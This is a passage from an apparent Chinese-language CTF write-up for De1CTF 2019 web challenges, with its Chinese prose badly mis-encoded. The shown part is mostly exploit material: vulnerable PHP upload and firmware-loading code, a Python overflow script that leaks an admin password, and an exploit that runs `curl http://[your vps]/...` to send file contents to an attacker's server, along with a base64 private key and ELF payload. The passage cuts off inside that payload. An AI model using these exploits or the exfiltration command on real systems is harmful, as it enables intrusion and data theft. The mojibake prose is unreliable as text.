class="string">"."</span>.$ext;</span></span><br><span class="line"><span class="php">        move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$new_name);</span></span><br><span class="line"><span class="php">        $_ = $_POST[<span class="string">'hello'</span>];</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(@substr(file($_)[<span class="number">0</span>],<span class="number">0</span>,<span class="number">6</span>)===<span class="string">'@&lt;?php'</span>)</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>(strpos($_,$new_name)===<span class="keyword">false</span>)</span></span><br><span class="line"><span class="php">            &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">include</span>($_);</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">            <span class="keyword">else</span></span></span><br><span class="line"><span class="php">            &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">echo</span> <span class="string">"you can do it!"</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        unlink($new_name);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br></pre></td></tr></table></figure>
<p>emmmmï¼Œä»¥å‰pwnhubçš„ä¸€ä¸ªåŸé¢˜ï¼Œä¸Šæµ·èµ›åˆç”¨äº†ä¸€æ¬¡ï¼Œè´´ä¸‹wpçš„åœ°å€ï¼š<a href="https://cloud.tencent.com/developer/article/1360551" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1360551</a>ï¼Œè·Ÿç€wpæ“ä½œå°±å¯ä»¥ä¸Šä¼ ä¸€ä¸ªshell.phpï¼Œç„¶ååŒ…å«å°±å¯ä»¥Getsgelläº†ï¼Œæœ€ååœ¨/etcä¸‹æ‰¾åˆ°äº†flag</p>
<p><img src="/2019/08/05/2019-De1CTF-Web-wp/8418106-6dc9875f8cc5fa3f.png" alt><br><img src="/2019/08/05/2019-De1CTF-Web-wp/8418106-840fd0082f85e1d4.png" alt></p>
<h3 id="0x03-cloudmusic-rev"><a href="#0x03-cloudmusic-rev" class="headerlink" title="0x03 cloudmusic_rev"></a>0x03 cloudmusic_rev</h3><p>è¿™ä¸ªé¢˜ç›®çš„1.0ç‰ˆæœ¬å†å›½èµ›æ€»å†³èµ›é¢˜ä¸­æœ‰æ”¾å‡ºï¼Œè¯¥é¢˜ä¸º2.0ç‰ˆæœ¬ï¼Œæ‰€ä»¥æ”»å‡»æµç¨‹å’ŒåŸé¢˜å·®ï¥§å¤ªå¤šï¼Œå‚è€ƒï¼š<a href="https://github.com/impakho/ciscn2019_final_web1ã€‚" target="_blank" rel="noopener">https://github.com/impakho/ciscn2019_final_web1ã€‚</a></p>
<p>ç›¸æ¯”å›½èµ›æ€»å†³èµ›å¢åŠ ï¦ºâ€˜.phpâ€™çš„è¿‡æ»¤ï¼Œä½†æ˜¯è¿”å›å€¼ç»™ï¦ºæç¤ºurlencodeã€‚urlencodeç¼–ç åå†base64ç¼–ç ï¼ŒæˆåŠŸç»•è¿‡ï¼Œå¯ä»¥å®ç°ä»»æ„æ–‡ä»¶è¯»å–ã€‚</p>
<p><img src="/2019/08/05/2019-De1CTF-Web-wp/8418106-ee581396e4c5e7bb.png" alt></p>
<p>å¹¶ä¸”ä¸Šä¼ æº¢å‡ºadminå¯†ç çš„é•¿åº¦å˜äº†ï¼Œä¹‹å‰æ˜¯0x300ï¼Œç°åœ¨æ˜¯0x70ã€‚</p>
<p><img src="/2019/08/05/2019-De1CTF-Web-wp/8418106-540a402178829b15.png" alt></p>
<p>æ‰€ä»¥åœ¨åŸé¢˜çš„expåŸºç¡€ä¸Šä¿®æ”¹æº¢å‡ºé•¿åº¦</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">def upload_music():</span><br><span class="line">    url = site_url + <span class="string">'/hotload.php?page=upload'</span></span><br><span class="line">    data = &#123;<span class="string">'file_id'</span>: <span class="string">'0'</span>&#125;</span><br><span class="line">    music = preset_music[:<span class="number">0</span>x6] + <span class="string">'\x00\x00\x03\x00'</span> +preset_music[<span class="number">0</span>x0<span class="variable">a:0x53</span>]</span><br><span class="line">    music += <span class="string">'\x00\x00\x03\x00'</span> + <span class="string">'\x00\x00\x03'</span> + <span class="string">'a'</span> * <span class="number">0</span>x70 + <span class="string">'\x00'</span></span><br><span class="line">    <span class="keyword">files</span> = &#123;<span class="string">'file_data'</span>: music&#125;</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(url)</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(data)</span><br><span class="line">    <span class="keyword">res</span> = post(<span class="number">1</span>, url, data, <span class="keyword">files</span>)</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(<span class="keyword">res</span>.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'"status":1'</span> in <span class="keyword">res</span>.tex<span class="variable">t:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> b64decode(json.loads(<span class="keyword">res</span>.content.strip())[<span class="string">'artist'</span>])[:<span class="number">16</span>]</span><br><span class="line">        excep<span class="variable">t:</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span></span><br></pre></td></tr></table></figure>
<p>æº¢å‡ºå¾—åˆ°adminç”¨æˆ·çš„å¯†ç ï¼šMike84eiNxHcMVCzï¼ŒæŸ¥çœ‹firmware.phpä»£ç </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'user'</span>])||strlen($_SESSION[<span class="string">'user'</span>])&lt;=<span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="php">    ob_end_clean();</span></span><br><span class="line"><span class="php">    header(<span class="string">'Location: /hotload.php?page=login&amp;err=1'</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($_SESSION[<span class="string">'role'</span>]!=<span class="string">'admin'</span>)&#123;</span></span><br><span class="line"><span class="php">    $padding=<span class="string">'Lorem ipsum dolor sit amet, consectetur adipisicing elit.'</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">10</span>;$i++) $padding.=$padding;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'&lt;div&gt;&lt;div class="container" style="margin-top:30px"&gt;&lt;h3 style="color:red;margin-bottom:15px;"&gt;Only admin is permitted.&lt;/h3&gt;&lt;/div&gt;&lt;p style="visibility: hidden"&gt;'</span>.$padding.<span class="string">'&lt;/p&gt;&lt;/div&gt;'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_FILES[<span class="string">"file_data"</span>]))&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($_FILES[<span class="string">"file_data"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>||$_FILES[<span class="string">"file_data"</span>][<span class="string">"size"</span>] &gt; <span class="number">1024</span>*<span class="number">1024</span>*<span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="php">        ob_end_clean();</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(json_encode(<span class="keyword">array</span>(<span class="string">'status'</span>=&gt;<span class="number">0</span>,<span class="string">'info'</span>=&gt;<span class="string">'upload err, maximum file size is 1MB.'</span>)));</span></span><br><span class="line"><span class="php">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        mt_srand(time());</span></span><br><span class="line"><span class="php">        $firmware_filename=md5(mt_rand().$_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span></span><br><span class="line"><span class="php">        $firmware_filename=<span class="keyword">__DIR__</span>.<span class="string">"/../uploads/firmware/"</span>.$firmware_filename.<span class="string">".elf"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (time()-$_SESSION[<span class="string">'timestamp'</span>]&lt;<span class="number">3</span>)&#123;</span></span><br><span class="line"><span class="php">            ob_end_clean();</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(json_encode(<span class="keyword">array</span>(<span class="string">'status'</span>=&gt;<span class="number">0</span>,<span class="string">'info'</span>=&gt;<span class="string">'too fast, try later.'</span>)));</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        $_SESSION[<span class="string">'timestamp'</span>]=time();</span></span><br><span class="line"><span class="php">        move_uploaded_file($_FILES[<span class="string">"file_data"</span>][<span class="string">"tmp_name"</span>], $firmware_filename);</span></span><br><span class="line"><span class="php">        $handle = fopen($firmware_filename, <span class="string">"rb"</span>);</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> ($handle==<span class="keyword">FALSE</span>)&#123;</span></span><br><span class="line"><span class="php">            ob_end_clean();</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(json_encode(<span class="keyword">array</span>(<span class="string">'status'</span>=&gt;<span class="number">0</span>,<span class="string">'info'</span>=&gt;<span class="string">'upload err, unknown fault.'</span>)));</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        $flags = fread($handle, <span class="number">4</span>);</span></span><br><span class="line"><span class="php">        fclose($handle);</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> ($flags!==<span class="string">"\x7fELF"</span>)&#123;</span></span><br><span class="line"><span class="php">            unlink($firmware_filename);</span></span><br><span class="line"><span class="php">            ob_end_clean();</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(json_encode(<span class="keyword">array</span>(<span class="string">'status'</span>=&gt;<span class="number">0</span>,<span class="string">'info'</span>=&gt;<span class="string">'upload err, not a valid elf file.'</span>)));</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        ob_end_clean();</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(json_encode(<span class="keyword">array</span>(<span class="string">'status'</span>=&gt;<span class="number">1</span>,<span class="string">'info'</span>=&gt;<span class="string">'upload succ.'</span>)));</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'CONTENT_TYPE'</span>]))&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'CONTENT_TYPE'</span>],<span class="string">'form-data'</span>)!=<span class="keyword">FALSE</span>)&#123;</span></span><br><span class="line"><span class="php">            ob_end_clean();</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(json_encode(<span class="keyword">array</span>(<span class="string">'status'</span>=&gt;<span class="number">0</span>,<span class="string">'info'</span>=&gt;<span class="string">'upload err, maximum file size is 1MB.'</span>)));</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">@$path=$_POST[<span class="string">'path'</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">clean_string</span><span class="params">($str)</span></span>&#123;</span></span><br><span class="line"><span class="php">    $str=str_replace(<span class="string">"\\"</span>,<span class="string">""</span>,$str);</span></span><br><span class="line"><span class="php">    $str=str_replace(<span class="string">"/"</span>,<span class="string">""</span>,$str);</span></span><br><span class="line"><span class="php">    $str=str_replace(<span class="string">"."</span>,<span class="string">""</span>,$str);</span></span><br><span class="line"><span class="php">    $str=str_replace(<span class="string">";"</span>,<span class="string">""</span>,$str);</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> substr($str,<span class="number">0</span>,<span class="number">32</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($path))&#123;</span></span><br><span class="line"><span class="php">    $path=clean_string(trim((string) $path));</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (strlen($path)&lt;=<span class="number">0</span>||strlen($path)&gt;<span class="number">64</span>)&#123;</span></span><br><span class="line"><span class="php">        ob_end_clean();</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(json_encode(<span class="keyword">array</span>(<span class="string">'status'</span>=&gt;<span class="number">0</span>,<span class="string">'info'</span>=&gt;<span class="string">'Format or length check failed.'</span>)));</span></span><br><span class="line"><span class="php">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        $firmware_filename=<span class="keyword">__DIR__</span>.<span class="string">"/../uploads/firmware/"</span>.$path.<span class="string">".elf"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (!file_exists($firmware_filename))&#123;</span></span><br><span class="line"><span class="php">            ob_end_clean();</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(json_encode(<span class="keyword">array</span>(<span class="string">'status'</span>=&gt;<span class="number">0</span>,<span class="string">'info'</span>=&gt;<span class="string">'File not found.'</span>)));</span></span><br><span class="line"><span class="php">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">try</span>&#123;</span></span><br><span class="line">                $elf = FFI::cdef("</span><br><span class="line">                    extern char * version;</span><br><span class="line"><span class="php">                <span class="string">", $firmware_filename);</span></span></span><br><span class="line"><span class="php">                $version=(string) FFI::string($elf-&gt;version);</span></span><br><span class="line"><span class="php">                <span class="keyword">if</span> ($version === <span class="string">"cloudmusic_rev"</span>)&#123;</span></span><br><span class="line"><span class="php">                    ob_end_clean();</span></span><br><span class="line"><span class="php">                    <span class="keyword">die</span>(json_encode(<span class="keyword">array</span>(<span class="string">'status'</span>=&gt;<span class="number">1</span>,<span class="string">'info'</span>=&gt;<span class="string">'Firmware version is cloudmusic_rev.'</span>)));</span></span><br><span class="line"><span class="php">                &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">                    ob_end_clean();</span></span><br><span class="line"><span class="php">                    <span class="keyword">die</span>(json_encode(<span class="keyword">array</span>(<span class="string">'status'</span>=&gt;<span class="number">0</span>,<span class="string">'info'</span>=&gt;<span class="string">'Bad version.'</span>)));</span></span><br><span class="line"><span class="php">                &#125;</span></span><br><span class="line"><span class="php">            &#125;<span class="keyword">catch</span>(Error $e)&#123;</span></span><br><span class="line"><span class="php">                ob_end_clean();</span></span><br><span class="line"><span class="php">                <span class="keyword">die</span>(json_encode(<span class="keyword">array</span>(<span class="string">'status'</span>=&gt;<span class="number">0</span>,<span class="string">'info'</span>=&gt;<span class="string">'Fail when loading firmware.'</span>)));</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­ç›¸è¾ƒäº1.0ï¼Œä»£ç ä¸­ä¸Šä¼ åæ–‡ä»¶åçš„å‘½åæ–¹å¼å˜ï¦º</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">$firmware_filename=md5(mt_rand().$_SERVER[<span class="string">'REMOTE_ADDR'</span>])<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<p>å³ç”¨æ—¶é—´å’Œå…¬ç½‘IPåœ°å€çš„MD5å€¼æ¥ç”Ÿæˆæ–‡ä»¶åï¼Œå¹¶ä¸”å›ºä»¶è¢«åŠ è½½åï¼Œæ‰§ï¨ˆå†…å®¹ï¥§ä¼šè¿”å›ã€‚æ‰€ä»¥éœ€è¦åˆ©ç”¨curlè®²æ‰§ï¨ˆç»“æœå¸¦å‡ºåˆ°vpsä¸Šã€‚ä¿®æ”¹åŸé¢˜ä¸­çš„expï¼š</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python2</span><br><span class="line">#codin<span class="variable">g:utf</span>-<span class="number">8</span></span><br><span class="line"></span><br><span class="line">from sys import *</span><br><span class="line">from base64 import *</span><br><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line">import requests</span><br><span class="line">import <span class="built_in">string</span></span><br><span class="line">import time</span><br><span class="line">import hashlib</span><br><span class="line">import random</span><br><span class="line">import json</span><br><span class="line">from datetime import datetime</span><br><span class="line"></span><br><span class="line">timeout = <span class="number">1.0</span></span><br><span class="line">retry_count = <span class="number">5</span></span><br><span class="line">logging = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">site_url = <span class="string">''</span></span><br><span class="line">s = requests.session()</span><br><span class="line">time_zone_offset = <span class="number">60</span> * <span class="number">60</span> * <span class="number">8</span></span><br><span class="line"><span class="keyword">command</span> = <span class="string">"curl http://[your vps]/`/usr/bin/tac /fl*g*`"</span></span><br><span class="line"># <span class="keyword">command</span> = <span class="string">"ls"</span></span><br><span class="line"></span><br><span class="line">preset_key = b64decode(<span class="string">'LS0tLS1CRUdJTiBQUklWQVRFIEtFWS0tLS0tCk1JSUNkd0lCQURBTkJna3Foa2lHOXcwQkFRRUZBQVNDQW1Fd2dnSmRBZ0VBQW9HQkFPTWp4eXVIcWRuSmFyUDAKSHl1eFVVRHkvY1BGaWMzYjM5WUQrVzY5R2VSRkpMRDUraFhaM3lYMTFBQ2pMSHpESFpIbGgrajRQZncxdEhMMApwY3FPZmJ0TTF4am5sV2FKd3lZQzRpWlBSRXJUTGNVd282UmhKS2diUkxHQVpLUmxmWFFMbVRwbGd0ZnJoUGhJCng0ZzM2ZEtLTVVlYjZnOHJ3blVrUnVYSVlhd2hBZ01CQUFFQ2dZRUEwUWZrQzFOV0pHOFFHM3ZXRThlakZ6cUgKL3RxVDd6Y2h6enJwR2RnOU02M09EbkIramcxckp1d01wbW1FVDJ6Z2tadkNiOHZFZjQ2TStoM2JWWVc4Zmg1Zwp4dTlXdmJFb0orUGZtV2R6SmowUlRYT05vZXVzRUgwODI3eGl6UXlIc21RbkNBQzkyUS9IQlg4WVl0eDgxN0pOCnNIUmNFMHdacVFmL0dkU0VnK0VDUVFEMGVjUlJYN3BsT0hTOHNjTjFqT3FOMEl5S2pvamljWWNQL2h3ckU2ZjIKZGR3dEpnNlJBb3E3SHlRdUFjYmZCazJwdS9UeDRsSHRycm9qRXlxQTRLdjdBa0VBN2RqUEFCakEvaHlpV1oxTQpDUm5DTTRudWdDUEE1SXRxZktzb3UvbE51cUdYZXFVYW5XNjBTcmJDVWJrM2g2NnkwdXV2T0xzendEWllONnNNClFEWFJrd0pBUlB3N1BtOFJ6TkF5ZUxCOHBDWUFaY1lNY21pb0RhWFZZOWpqbi9BcS9Ddmoxa1dmNUtGZi9rOWEKU1RVdEplL0VhSG5tTTM4V2VVaE5zK29MbTFSS2t3SkFNcCtyNTJ4ZFgzaSt3VzR1YWQxMnJUdVZiT2F2UHJYQgowNGttb1dPOXZKUjZSbHR2MzhSWlVYRzJ5R2d3dm90YmVuTTVsMHlaQmpkSzdZWlZsREVnU3dKQkFMb29yYmZnCkJzMW5BbGU3WnhXK0JkRXlLVG9ZUWdWVU1MRytWeDFITW9rU0dZNlh6blNFYzdpK25weFBoeGd6Q1VWdHpxNU4KR3E4Q3ppN2FJUFVuY0lnPQotLS0tLUVORCBQUklWQVRFIEtFWS0tLS0tCg=='</span>)</span><br><span class="line">preset_music = b64decode(<span class="string">'SUQzBAAAAAABBFRSQ0sAAAADAAADMQBUSVQyAAAAEgAAA2JiYmJiYmJiYmJiYmJiYmIAVEFMQgAAABIAAANjY2NjY2NjY2NjY2NjY2NjAFRQRTEAAAASAAADYWFhYWFhYWFhYWFhYWFhYQA='</span>)</span><br><span class="line">preset_firmare = b64decode(<span class="string">'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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA